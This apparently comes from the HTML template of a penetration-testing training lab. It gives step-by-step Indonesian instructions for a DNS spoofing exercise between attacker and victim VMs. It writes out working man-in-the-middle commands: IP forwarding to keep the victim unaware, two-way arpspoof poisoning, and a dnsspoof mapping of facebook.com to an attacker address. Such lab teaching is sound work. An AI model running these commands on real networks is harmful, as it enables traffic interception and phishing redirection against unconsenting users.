{% extends "layout/base.html" %}

{% block title %}DNS Spoofing Simulation - Virtual Pen Test Lab{% endblock %}

{% block content %}
<div class="page-header">
    <div class="d-flex justify-content-between align-items-center">
        <div>
            <h1 class="page-title">DNS Spoofing Simulation</h1>
            <p class="page-subtitle">Simulasi serangan DNS Spoofing untuk membelokkan traffic korban.</p>
        </div>
        <div class="vm-status status-active">
            Lab Active
        </div>
    </div>
</div>

<div class="lab-layout">
    <!-- LEFT COLUMN: STEPS -->
    <aside class="lab-steps">
        <h3 class="card-title">Guide Instructions</h3>
        <div class="steps-container">

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step1')">
                    1. Start Virtual Machines
                </button>
                <div id="step1" class="step-content open">
                    <p>Nyalakan VM Attacker dan Victim. Pastikan keduanya berada dalam satu jaringan internal yang sama.
                    </p>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step2')">
                    2. Network Check
                </button>
                <div id="step2" class="step-content">
                    <p>Cek IP address dan konektivitas (ping):</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px;">ip a</code>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px;">ping &lt;victim_ip&gt;</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step3')">
                    3. Enable IP Forwarding
                </button>
                <div id="step3" class="step-content">
                    <p>Aktifkan forwarding agar traffic tetap bisa lewat (agar korban tidak curiga putus koneksi):</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">echo 1 > /proc/sys/net/ipv4/ip_forward</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step4')">
                    4. ARP Spoofing
                </button>
                <div id="step4" class="step-content">
                    <p>Lakukan ARP poisoning (Man-in-the-Middle) dua arah:</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">arpspoof -i eth0 -t &lt;victim_ip&gt; &lt;gateway_ip&gt;</code>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">arpspoof -i eth0 -t &lt;gateway_ip&gt; &lt;victim_ip&gt;</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step5')">
                    5. DNS Spoofing
                </button>
                <div id="step5" class="step-content">
                    <p>Buat file <code>dns.txt</code> berisi mapping domain palsu:</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">echo "facebook.com 192.168.56.100" > dns.txt</code>
                    <p class="mt-4">Jalankan dnsspoof:</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">dnsspoof -i eth0 -f dns.txt</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step6')">
                    6. Verification
                </button>
                <div id="step6" class="step-content">
                    <p>Buka browser di Victim VM dan akses <code>facebook.com</code>. Halaman seharusnya mengarah ke
                        server attacker (192.168.56.100).</p>
                </div>
            </div>

        </div>
    </aside>

    <!-- RIGHT COLUMN: VM PREVIEW -->
    <main class="lab-main">
        <div class="vm-grid">
            <!-- Attacker Box -->
            <div class="vm-card">
                <h3 class="card-title">Attacker VM (Kali Linux)</h3>
                <div class="vm-preview">
                    <span>Attacker Terminal Stream</span>
                </div>
                <div class="vm-controls">
                    <button class="btn btn-primary">Start VM</button>
                    <button class="btn btn-outline">Reset</button>
                    <span class="vm-status status-inactive">Offline</span>
                </div>
            </div>

            <!-- Victim Box -->
            <div class="vm-card">
                <h3 class="card-title">Victim VM (Windows/Linux)</h3>
                <div class="vm-preview">
                    <span>Victim Desktop Stream</span>
                </div>
                <div class="vm-controls">
                    <button class="btn btn-outline">Check Status</button>
                    <span style="font-size: 0.875rem; color: var(--text-muted);">IP: Target</span>
                </div>
            </div>
        </div>

    </main>
</div>
{% endblock %}